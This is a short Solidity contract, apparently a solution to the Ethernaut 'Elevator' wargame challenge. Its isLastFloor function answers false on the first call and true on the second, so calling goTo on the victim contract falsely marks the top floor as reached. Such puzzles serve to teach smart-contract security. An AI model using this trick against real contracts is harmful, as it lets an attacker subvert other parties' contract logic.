pragma solidity ^0.8.11;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    bool public isFirstAttempt = true;
    Elevator public _victim;

    constructor(address payable victim) {
        _victim = Elevator(victim);
    }

    function attack() external {
        _victim.goTo(2);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (isFirstAttempt) {
            isFirstAttempt = false;
            return false;
        } else {
            return true;
        }
    }
}
